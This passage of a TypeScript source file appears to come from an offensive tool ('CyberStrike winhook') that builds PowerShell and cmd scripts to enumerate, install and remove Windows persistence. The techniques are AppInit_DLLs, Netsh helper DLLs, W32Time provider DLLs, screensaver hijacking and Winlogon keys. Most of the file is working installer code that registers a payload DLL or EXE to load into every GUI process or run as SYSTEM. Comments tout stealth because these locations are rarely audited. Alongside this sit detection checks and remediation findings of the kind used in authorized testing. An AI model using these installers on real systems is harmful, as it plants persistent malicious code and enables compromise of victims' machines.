      })
    }
  }

  if (action === "restore") {
    const script =
      key === "userinit"
        ? `Set-ItemProperty '${winlogonPath}' -Name Userinit -Value 'C:\\Windows\\system32\\userinit.exe,' -Type String; Write-Output "[+] Userinit restored to default"`
        : key === "shell"
          ? `Set-ItemProperty '${winlogonPath}' -Name Shell -Value 'explorer.exe' -Type String; Write-Output "[+] Shell restored to default"`
          : `Remove-Item '${winlogonPath}\\Notify\\CyberStrike' -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "[+] Notify key removed"`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function appinitDll(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const scope = argVal(args, "--scope") || "machine"
  const findings: Finding[] = []
  const output: string[] = ["[*] AppInit_DLLs Persistence...\n"]

  const regPath =
    scope === "wow64"
      ? "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
      : "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
  const regPathCmd =
    scope === "wow64"
      ? "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
      : "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== AppInit_DLLs Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const native = await cmd(
        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`,
        timeout,
      )
      const load = await cmd(
        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs"`,
        timeout,
      )
      output.push("[*] Native (64-bit):")
      output.push(`    AppInit_DLLs: ${native.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || "(empty)"}`)
      output.push(`    LoadAppInit_DLLs: ${load.stdout.match(/0x(\d+)/)?.[1] || "0"}`)
      if (load.stdout.includes("0x1"))
        output.push("    [!] Loading ENABLED — DLLs injected into all User32.dll processes")
      const wow = await cmd(
        `reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`,
        timeout,
      )
      if (wow.exitCode === 0) {
        output.push("\n[*] Wow64 (32-bit):")
        output.push(`    AppInit_DLLs: ${wow.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || "(empty)"}`)
      }
      if (load.stdout.includes("0x1"))
        findings.push({
          checkId: "WIN-APPI-001",
          provider: "windows",
          severity: "high",
          status: "ENABLED",
          resource: "registry://appinit",
          title: "AppInit_DLLs loading enabled",
          details: "DLLs in AppInit_DLLs injected into all GUI processes.",
          remediation: "Set LoadAppInit_DLLs to 0.",
        })
    }
    if (action === "install") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const current = await cmd(`reg query "${regPathCmd}" /v "AppInit_DLLs"`, timeout)
      const curVal = current.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || ""
      const newVal = curVal ? `${curVal} ${dll}` : dll
      await cmd(`reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "${newVal}" /f`, timeout)
      const r = await cmd(`reg add "${regPathCmd}" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] AppInit_DLLs: ${newVal}\n[+] LoadAppInit_DLLs: 1\n[*] DLL injected into all new User32.dll processes`
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-APPI-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `appinit://${scope}`,
          title: `AppInit_DLLs: ${dll} (${scope})`,
          details: "DLL injected into every User32 process. Persists across reboots.",
          remediation: `Remove: reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "" /f`,
        })
    }
    if (action === "remove") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const current = await cmd(`reg query "${regPathCmd}" /v "AppInit_DLLs"`, timeout)
      const curVal = current.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || ""
      const newVal = curVal
        .split(" ")
        .filter((d: string) => d !== dll)
        .join(" ")
      await cmd(`reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "${newVal}" /f`, timeout)
      if (!newVal.trim()) await cmd(`reg add "${regPathCmd}" /v "LoadAppInit_DLLs" /t REG_DWORD /d 0 /f`, timeout)
      output.push(`[+] Removed ${dll} from AppInit_DLLs`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== AppInit_DLLs Configuration ==="
Write-Output ""

# Native (64-bit)
$native = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows' -ErrorAction SilentlyContinue
Write-Output "[*] Native (64-bit):"
Write-Output "    AppInit_DLLs: $($native.AppInit_DLLs)"
Write-Output "    LoadAppInit_DLLs: $($native.LoadAppInit_DLLs)"
Write-Output "    RequireSignedAppInit_DLLs: $($native.RequireSignedAppInit_DLLs)"
if ($native.LoadAppInit_DLLs -eq 1) {
  Write-Output "    [!] Loading ENABLED — DLLs in AppInit_DLLs are injected into all User32.dll processes"
}
if ($native.RequireSignedAppInit_DLLs -eq 1) {
  Write-Output "    [!] Signature requirement ENABLED — only signed DLLs will load"
}
Write-Output ""

# Wow64 (32-bit)
$wow = Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows' -ErrorAction SilentlyContinue
if ($wow) {
  Write-Output "[*] Wow64 (32-bit):"
  Write-Output "    AppInit_DLLs: $($wow.AppInit_DLLs)"
  Write-Output "    LoadAppInit_DLLs: $($wow.LoadAppInit_DLLs)"
  Write-Output "    RequireSignedAppInit_DLLs: $($wow.RequireSignedAppInit_DLLs)"
  if ($wow.LoadAppInit_DLLs -eq 1) {
    Write-Output "    [!] Loading ENABLED (32-bit)"
  }
}
Write-Output ""

# Secure Boot check
$sb = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
Write-Output "[*] Secure Boot: $(if ($sb) { 'ENABLED — RequireSignedAppInit_DLLs enforced by kernel' } else { 'DISABLED or not available' })"
Write-Output ""
Write-Output "[*] AppInit_DLLs loads into EVERY process that imports User32.dll"
Write-Output "[*] On Windows 8+, LoadAppInit_DLLs=0 by default (must enable)"
Write-Output "[*] On Windows 8+ with Secure Boot, unsigned DLLs are blocked"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("Loading ENABLED")) {
      findings.push({
        checkId: "WIN-APPI-011",
        provider: "windows",
        severity: "high",
        status: "ENABLED",
        resource: "registry://appinit",
        title: "AppInit_DLLs loading is enabled — DLLs injected into all GUI processes",
        details: "LoadAppInit_DLLs=1 means any DLL in AppInit_DLLs value will be loaded into every User32.dll process.",
        remediation: "Set LoadAppInit_DLLs to 0 unless required by specific software.",
      })
    }
  }

  if (action === "install") {
    if (!dll) {
      output.push("ERROR: --dll required (path to DLL)")
      output.push("")
      output.push("Usage: winhook appinit_dll --action install --dll C:\\path\\payload.dll")
      output.push("")
      output.push("Scopes:")
      output.push("  --scope machine  — 64-bit processes (default)")
      output.push("  --scope wow64    — 32-bit processes on 64-bit OS")
      output.push("")
      output.push("[!] WARNING: Buggy DLLs will crash EVERY GUI application")
      output.push("[!] Test your DLL thoroughly before deploying")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing AppInit_DLL ==="
Write-Output "DLL: ${dll}"
Write-Output "Scope: ${scope}"
Write-Output ""

$regPath = '${regPath}'

# Get current value and append
$current = (Get-ItemProperty $regPath -Name AppInit_DLLs -ErrorAction SilentlyContinue).AppInit_DLLs
if ($current) {
  $new = "$current ${dll}"
} else {
  $new = "${dll}"
}

# Set DLL path
Set-ItemProperty $regPath -Name AppInit_DLLs -Value $new -Type String

# Enable loading
Set-ItemProperty $regPath -Name LoadAppInit_DLLs -Value 1 -Type DWord

# Check signature requirement
$sigReq = (Get-ItemProperty $regPath -Name RequireSignedAppInit_DLLs -ErrorAction SilentlyContinue).RequireSignedAppInit_DLLs
if ($sigReq -eq 1) {
  Write-Output "[!] RequireSignedAppInit_DLLs=1 — your DLL must be signed"
  Write-Output "[*] To disable (risky): Set-ItemProperty '$regPath' -Name RequireSignedAppInit_DLLs -Value 0"
}

$verify = Get-ItemProperty $regPath
Write-Output "[+] AppInit_DLLs: $($verify.AppInit_DLLs)"
Write-Output "[+] LoadAppInit_DLLs: $($verify.LoadAppInit_DLLs)"
Write-Output ""
Write-Output "[*] DLL will be loaded into all new processes that import User32.dll"
Write-Output "[*] Already-running processes are NOT affected (only new processes)"
Write-Output ""
Write-Output "Remove: winhook appinit_dll --action remove --dll ${dll}"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-APPI-012",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `appinit://${scope}`,
        title: `AppInit_DLLs persistence installed: ${dll} (${scope})`,
        details: "DLL will be injected into every User32.dll process. Persists across reboots.",
        remediation: `Remove: winhook appinit_dll --action remove --dll ${dll}`,
      })
    }
  }

  if (action === "remove") {
    if (!dll) {
      output.push("ERROR: --dll required (DLL path to remove)")
      return { output: output.join("\n"), findings }
    }

    const script = `
$regPath = '${regPath}'
$current = (Get-ItemProperty $regPath -Name AppInit_DLLs).AppInit_DLLs
$new = ($current -split ' ' | Where-Object { $_ -ne '${dll}' }) -join ' '
Set-ItemProperty $regPath -Name AppInit_DLLs -Value $new -Type String

if (-not $new.Trim()) {
  Set-ItemProperty $regPath -Name LoadAppInit_DLLs -Value 0 -Type DWord
  Write-Output "[+] No DLLs remaining — disabled LoadAppInit_DLLs"
}

Write-Output "[+] Removed ${dll} from AppInit_DLLs"
Write-Output "[*] New value: $new"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function netshHelper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const helperName = argVal(args, "--name") || "CyberStrikeHelper"
  const findings: Finding[] = []
  const output: string[] = ["[*] Netsh Helper DLL Persistence...\n"]

  const regPath = "HKLM:\\SOFTWARE\\Microsoft\\NetSh"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Netsh Helper Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\NetSh"`, timeout)
      output.push("[*] Registered netsh helpers:\n" + (r.stdout || "(none)"))
      output.push(
        "\n[*] Known Microsoft helpers: dhcpclient, dot3cfg, fwcfg, hnetmon, ifmon, napmontr, netiohlp, nshhttp, nshipsec, nshwfp, ras, rpcnsh, whhelper, wshelper",
      )
    }
    if (action === "install") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const r = await cmd(
        `reg add "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /t REG_SZ /d "${dll}" /f`,
        timeout,
      )
      output.push(
        r.exitCode === 0
          ? `[+] Netsh helper registered: ${helperName} → ${dll}\n[*] DLL loads on next netsh invocation\n[*] Also triggered by gpupdate (Group Policy refresh)`
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-NTSH-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `netsh://${helperName}`,
          title: `Netsh helper: ${helperName} → ${dll}`,
          details: "DLL loads on every netsh invocation. Persists across reboots.",
          remediation: `Remove: reg delete "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${helperName}" /f`,
        })
    }
    if (action === "remove") {
      const name = argVal(args, "--name")
      if (!name) {
        output.push("ERROR: --name required")
        return { output: output.join("\n"), findings }
      }
      const r = await cmd(`reg delete "HKLM\\SOFTWARE\\Microsoft\\NetSh" /v "${name}" /f`, timeout)
      output.push(r.exitCode === 0 ? `[+] Netsh helper '${name}' removed` : `[!] Failed: ${r.stderr}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Registered Netsh Helpers ==="
Write-Output ""

$helpers = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue
if ($helpers) {
  $props = $helpers.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' }
  $suspiciousCount = 0
  foreach ($p in $props) {
    $dllPath = $p.Value
    $name = $p.Name
    $exists = Test-Path $dllPath -ErrorAction SilentlyContinue
    $signed = $false
    if ($exists) {
      $sig = Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue
      $signed = $sig.Status -eq 'Valid'
    }
    $status = if (-not $exists) { "[!] FILE MISSING" } elseif (-not $signed) { "[!] UNSIGNED"; $suspiciousCount++ } else { "[OK] Signed" }
    Write-Output "  $name"
    Write-Output "    DLL: $dllPath"
    Write-Output "    Status: $status"
    Write-Output ""
  }
  Write-Output "Total helpers: $($props.Count)"
  Write-Output "SUSPICIOUS_COUNT=$suspiciousCount"

  # Known legitimate helpers
  Write-Output ""
  Write-Output "[*] Known Microsoft helpers: dhcpclient, dot3cfg, fwcfg, hnetmon, ifmon, napmontr, netiohlp, nteventlog, nshhttp, nshipsec, nshwfp, p2pnetsh, peerdistsh, ras, rpcnsh, whhelper, wshelper, wwancfg"
} else {
  Write-Output "[*] No netsh helpers found (unusual)"
}

Write-Output ""
Write-Output "[*] Netsh helpers load when netsh.exe runs (admin tasks, firewall config, etc.)"
Write-Output "[*] Common trigger: Group Policy refresh runs netsh for firewall rules"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const suspMatch = r.stdout.match(/SUSPICIOUS_COUNT=(\d+)/)
    if (suspMatch && parseInt(suspMatch[1]) > 0) {
      findings.push({
        checkId: "WIN-NTSH-001",
        provider: "windows",
        severity: "medium",
        status: "SUSPICIOUS",
        resource: "registry://netsh",
        title: `${suspMatch[1]} unsigned netsh helper DLL(s) found`,
        details: "Unsigned DLLs registered as netsh helpers may indicate persistence. Review non-Microsoft entries.",
        remediation: "Remove suspicious entries from HKLM\\SOFTWARE\\Microsoft\\NetSh.",
      })
    }
  }

  if (action === "install") {
    if (!dll) {
      output.push("ERROR: --dll required (path to helper DLL)")
      output.push("")
      output.push("Usage: winhook netsh_helper --action install --dll C:\\path\\helper.dll [--name MyHelper]")
      output.push("")
      output.push("[*] DLL must export InitHelperDll function")
      output.push("[*] Loads whenever netsh.exe is invoked (admin tasks, GP refresh)")
      output.push("[*] Runs in the context of the netsh.exe caller")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing Netsh Helper ==="
Write-Output "Name: ${helperName}"
Write-Output "DLL: ${dll}"
Write-Output ""

Set-ItemProperty '${regPath}' -Name '${helperName}' -Value '${dll}' -Type String

$verify = (Get-ItemProperty '${regPath}' -Name '${helperName}').${helperName}
Write-Output "[+] Registered: ${helperName} -> $verify"
Write-Output ""
Write-Output "[*] DLL loads on next netsh.exe invocation"
Write-Output "[*] Trigger: netsh advfirewall show allprofiles (or any netsh command)"
Write-Output "[*] Also triggered by Group Policy refresh (gpupdate)"
Write-Output ""
Write-Output "Remove: winhook netsh_helper --action remove --name ${helperName}"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-NTSH-011",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `netsh://${helperName}`,
        title: `Netsh helper DLL registered: ${helperName} → ${dll}`,
        details: "DLL loads on every netsh.exe invocation. Persists across reboots.",
        remediation: `Remove: winhook netsh_helper --action remove --name ${helperName}`,
      })
    }
  }

  if (action === "remove") {
    const name = argVal(args, "--name")
    if (!name) {
      output.push("ERROR: --name required (helper name to remove)")
      return { output: output.join("\n"), findings }
    }

    const script = `
Remove-ItemProperty '${regPath}' -Name '${name}' -Force -ErrorAction SilentlyContinue
Write-Output "[+] Netsh helper '${name}' removed"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function timeProvider(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const providerName = argVal(args, "--name") || "CyberStrikeTimeProvider"
  const findings: Finding[] = []
  const output: string[] = ["[*] Windows Time Provider DLL Persistence...\n"]

  const regBase = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders"
  const regBaseCmd = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Time Provider Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const svc = await cmd("sc query W32Time", timeout)
      output.push("[*] W32Time service:\n" + svc.stdout)
      const r = await cmd(`reg query "${regBaseCmd}" /s`, timeout)
      output.push("\n[*] Time providers:\n" + (r.stdout || "(none)"))
      output.push("\n[*] Known providers: NtpClient, NtpServer, VMICTimeProvider")
    }
    if (action === "install") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const provPath = `${regBaseCmd}\\${providerName}`
      await cmd(`reg add "${provPath}" /v "DllName" /t REG_SZ /d "${dll}" /f`, timeout)
      await cmd(`reg add "${provPath}" /v "Enabled" /t REG_DWORD /d 1 /f`, timeout)
      const r = await cmd(`reg add "${provPath}" /v "InputProvider" /t REG_DWORD /d 1 /f`, timeout)
      output.push(
        r.exitCode === 0 ? `[+] Time provider registered: ${providerName}\n    DLL: ${dll}` : `[!] Failed: ${r.stderr}`,
      )
      const restart = await cmd("net stop W32Time && net start W32Time", timeout)
      output.push(
        restart.exitCode === 0 ? "[+] W32Time restarted — DLL loaded as SYSTEM" : `[!] Restart: ${restart.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-TIME-010",
          provider: "windows",
          severity: "critical",
          status: "PERSISTED",
          resource: `w32time://${providerName}`,
          title: `Time provider: ${providerName} → ${dll}`,
          details: "Runs as SYSTEM in W32Time service. Rarely audited.",
          remediation: `Remove: reg delete "${provPath}" /f`,
        })
    }
    if (action === "remove") {
      const name = argVal(args, "--name")
      if (!name) {
        output.push("ERROR: --name required")
        return { output: output.join("\n"), findings }
      }
      const r = await cmd(`reg delete "${regBaseCmd}\\${name}" /f`, timeout)
      output.push(r.exitCode === 0 ? `[+] Time provider '${name}' removed` : `[!] Failed: ${r.stderr}`)
      await cmd("net stop W32Time && net start W32Time", timeout)
      output.push("[+] W32Time restarted")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== W32Time Service Status ==="
$svc = Get-Service W32Time -ErrorAction SilentlyContinue
Write-Output "[*] Service: $($svc.DisplayName)"
Write-Output "[*] Status: $($svc.Status)"
Write-Output "[*] StartType: $($svc.StartType)"
Write-Output ""

Write-Output "=== Registered Time Providers ==="
$providers = Get-ChildItem '${regBase}' -ErrorAction SilentlyContinue
$suspiciousCount = 0
foreach ($p in $providers) {
  $props = Get-ItemProperty $p.PSPath
  $dllPath = $props.DllName
  $enabled = $props.Enabled
  $inputProvider = $props.InputProvider

  Write-Output "  $($p.PSChildName)"
  Write-Output "    DllName: $dllPath"
  Write-Output "    Enabled: $(if ($enabled -eq 1) { 'Yes' } else { 'No' })"
  Write-Output "    InputProvider: $(if ($inputProvider -eq 1) { 'Yes' } else { 'No' })"

  # Check if it's a known Microsoft provider
  $known = @('NtpClient', 'NtpServer', 'VMICTimeProvider')
  if ($p.PSChildName -notin $known) {
    Write-Output "    [!] NON-STANDARD provider"
    $suspiciousCount++
  }

  if ($dllPath) {
    $exists = Test-Path $dllPath -ErrorAction SilentlyContinue
    if (-not $exists) {
      Write-Output "    [!] DLL not found at path"
    } else {
      $sig = Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue
      if ($sig.Status -ne 'Valid') {
        Write-Output "    [!] DLL is UNSIGNED"
        $suspiciousCount++
      }
    }
  }
  Write-Output ""
}

Write-Output "SUSPICIOUS_COUNT=$suspiciousCount"
Write-Output ""
Write-Output "[*] Time providers run as SYSTEM in svchost.exe (W32Time service)"
Write-Output "[*] Default providers: NtpClient, NtpServer, VMICTimeProvider (Hyper-V)"
Write-Output "[*] Custom providers are rarely audited — excellent for stealth persistence"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const suspMatch = r.stdout.match(/SUSPICIOUS_COUNT=(\d+)/)
    if (suspMatch && parseInt(suspMatch[1]) > 0) {
      findings.push({
        checkId: "WIN-TIME-001",
        provider: "windows",
        severity: "high",
        status: "SUSPICIOUS",
        resource: "registry://w32time",
        title: `${suspMatch[1]} suspicious time provider(s) detected`,
        details: "Non-standard or unsigned time provider DLLs may indicate persistence.",
        remediation: "Remove suspicious entries from W32Time\\TimeProviders registry.",
      })
    }
  }

  if (action === "install") {
    if (!dll) {
      output.push("ERROR: --dll required (path to time provider DLL)")
      output.push("")
      output.push("Usage: winhook time_provider --action install --dll C:\\path\\provider.dll [--name MyProvider]")
      output.push("")
      output.push("[*] DLL must export TimeProvOpen, TimeProvCommand, TimeProvClose")
      output.push("[*] Runs as SYSTEM in svchost.exe (W32Time service group)")
      output.push("[*] Survives reboots, loads on service start")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing Time Provider ==="
Write-Output "Name: ${providerName}"
Write-Output "DLL: ${dll}"
Write-Output ""

$provPath = '${regBase}\\${providerName}'
New-Item -Path $provPath -Force | Out-Null
Set-ItemProperty $provPath -Name DllName -Value '${dll}' -Type String
Set-ItemProperty $provPath -Name Enabled -Value 1 -Type DWord
Set-ItemProperty $provPath -Name InputProvider -Value 1 -Type DWord

Write-Output "[+] Time provider registered"
Write-Output ""

# Restart W32Time to load the new provider
Restart-Service W32Time -Force -ErrorAction SilentlyContinue
$svc = Get-Service W32Time
Write-Output "[*] W32Time service status: $($svc.Status)"
Write-Output ""
Write-Output "[+] Provider DLL loaded in SYSTEM context"
Write-Output "[*] Persists across reboots (service auto-start)"
Write-Output ""
Write-Output "Remove: winhook time_provider --action remove --name ${providerName}"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-TIME-011",
        provider: "windows",
        severity: "critical",
        status: "PERSISTED",
        resource: `w32time://${providerName}`,
        title: `Time provider persistence installed: ${providerName} → ${dll}`,
        details: "DLL runs as SYSTEM in W32Time service. Survives reboots, rarely audited.",
        remediation: `Remove: winhook time_provider --action remove --name ${providerName}`,
      })
    }
  }

  if (action === "remove") {
    const name = argVal(args, "--name")
    if (!name) {
      output.push("ERROR: --name required (provider name to remove)")
      return { output: output.join("\n"), findings }
    }

    const script = `
$provPath = '${regBase}\\${name}'
if (Test-Path $provPath) {
  Remove-Item $provPath -Recurse -Force
  Write-Output "[+] Time provider '${name}' removed"
  Restart-Service W32Time -Force -ErrorAction SilentlyContinue
  Write-Output "[+] W32Time service restarted"
} else {
  Write-Output "[-] Provider '${name}' not found"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function screensaverPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const payload = argVal(args, "--payload")
  const ssTimeout = argVal(args, "--timeout") || "60"
  const findings: Finding[] = []
  const output: string[] = ["[*] Screensaver Persistence...\n"]

  const regPath = "HKCU:\\Control Panel\\Desktop"
  const regPathCmd = "HKCU\\Control Panel\\Desktop"

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Screensaver Persistence (cmd.exe) ===\n")
    if (action === "enum") {
      const scrnsave = await cmd(`reg query "${regPathCmd}" /v "SCRNSAVE.EXE"`, timeout)
      const active = await cmd(`reg query "${regPathCmd}" /v "ScreenSaveActive"`, timeout)
      const tout = await cmd(`reg query "${regPathCmd}" /v "ScreenSaveTimeOut"`, timeout)
      output.push(`[*] SCRNSAVE.EXE: ${scrnsave.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "(not set)"}`)
      output.push(`[*] Active: ${active.stdout.includes("1") ? "Yes" : "No"}`)
      output.push(`[*] Timeout: ${tout.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "(not set)"}`)
      output.push("\n[*] .SCR files are just .EXE — any executable works")
      output.push("[*] No admin required — per-user HKCU persistence")
    }
    if (action === "install") {
      if (!payload) {
        output.push("ERROR: --payload required")
        return { output: output.join("\n"), findings }
      }
      await cmd(`reg add "${regPathCmd}" /v "SCRNSAVE.EXE" /t REG_SZ /d "${payload}" /f`, timeout)
      await cmd(`reg add "${regPathCmd}" /v "ScreenSaveActive" /t REG_SZ /d "1" /f`, timeout)
      await cmd(`reg add "${regPathCmd}" /v "ScreenSaveTimeOut" /t REG_SZ /d "${ssTimeout}" /f`, timeout)
      const r = await cmd(`reg add "${regPathCmd}" /v "ScreenSaverIsSecure" /t REG_SZ /d "0" /f`, timeout)
      output.push(
        r.exitCode === 0
          ? `[+] Screensaver set: ${payload}\n[+] Timeout: ${ssTimeout}s\n[*] Runs as current user when idle`
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-SCRN-010",
          provider: "windows",
          severity: "high",
          status: "PERSISTED",
          resource: "screensaver://hkcu",
          title: `Screensaver persistence: ${payload} (${ssTimeout}s)`,
          details: "Runs as current user on idle. No admin required.",
          remediation: `Remove: reg delete "${regPathCmd}" /v "SCRNSAVE.EXE" /f`,
        })
    }
    if (action === "remove") {
      await cmd(`reg delete "${regPathCmd}" /v "SCRNSAVE.EXE" /f`, timeout)
      await cmd(`reg add "${regPathCmd}" /v "ScreenSaveActive" /t REG_SZ /d "0" /f`, timeout)
      output.push("[+] Screensaver persistence removed")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Screensaver Configuration ==="
Write-Output ""

$desktop = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue

$scrnsave = $desktop.SCRNSAVE.EXE
$active = $desktop.ScreenSaveActive
$timeout = $desktop.ScreenSaveTimeOut
$secure = $desktop.ScreenSaverIsSecure

Write-Output "[*] SCRNSAVE.EXE: $(if ($scrnsave) { $scrnsave } else { '(not set)' })"
Write-Output "[*] ScreenSaveActive: $(if ($active -eq '1') { 'Yes' } else { 'No' })"
Write-Output "[*] ScreenSaveTimeOut: $(if ($timeout) { "$timeout seconds" } else { '(not set)' })"
Write-Output "[*] ScreenSaverIsSecure: $(if ($secure -eq '1') { 'Yes (lock on resume)' } else { 'No' })"
Write-Output ""

if ($scrnsave) {
  $exists = Test-Path $scrnsave -ErrorAction SilentlyContinue
  if ($exists) {
    $sig = Get-AuthenticodeSignature $scrnsave -ErrorAction SilentlyContinue
    $hash = (Get-FileHash $scrnsave -Algorithm SHA256).Hash
    Write-Output "[*] File exists: Yes"
    Write-Output "[*] Signature: $($sig.Status)"
    Write-Output "[*] SHA256: $hash"

    # Check if it's a known Windows screensaver
    $knownSS = @('ssText3d.scr','Bubbles.scr','Mystify.scr','Ribbons.scr','PhotoScreensaver.dll','scrnsave.scr')
    $fileName = [System.IO.Path]::GetFileName($scrnsave)
    if ($fileName -notin $knownSS) {
      Write-Output "[!] Non-standard screensaver binary"
    }
  } else {
    Write-Output "[!] SCRNSAVE.EXE points to non-existent file"
  }
}

# Check GPO-enforced screensaver
$gpPath = 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop'
$gpSS = (Get-ItemProperty $gpPath -Name SCRNSAVE.EXE -ErrorAction SilentlyContinue).'SCRNSAVE.EXE'
if ($gpSS) {
  Write-Output ""
  Write-Output "[*] GPO-enforced screensaver: $gpSS"
  Write-Output "[!] GPO settings override user settings"
}

Write-Output ""
Write-Output "[*] Screensaver runs as current user when idle timeout is reached"
Write-Output "[*] .SCR files are just renamed .EXE — any executable works"
Write-Output "[*] No admin required — per-user HKCU persistence"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("Non-standard screensaver")) {
      findings.push({
        checkId: "WIN-SCRN-001",
        provider: "windows",
        severity: "medium",
        status: "SUSPICIOUS",
        resource: "registry://screensaver",
        title: "Non-standard screensaver binary configured",
        details: "SCRNSAVE.EXE points to a non-standard binary that may be malicious.",
        remediation: "Remove or replace with a legitimate screensaver.",
      })
    }
  }

  if (action === "install") {
    if (!payload) {
      output.push("ERROR: --payload required (path to payload executable)")
      output.push("")
      output.push("Usage: winhook screensaver_persist --action install --payload C:\\path\\payload.exe [--timeout 60]")
      output.push("")
      output.push("[*] .SCR files are just .EXE files — any executable works")
      output.push("[*] Payload runs as current user when idle timeout is reached")
      output.push("[*] No admin required — modifies HKCU (per-user)")
      output.push("[*] Default timeout: 60 seconds of idle time")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing Screensaver Persistence ==="
Write-Output "Payload: ${payload}"
Write-Output "Timeout: ${ssTimeout} seconds"
Write-Output ""

# Save original values
$orig = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue
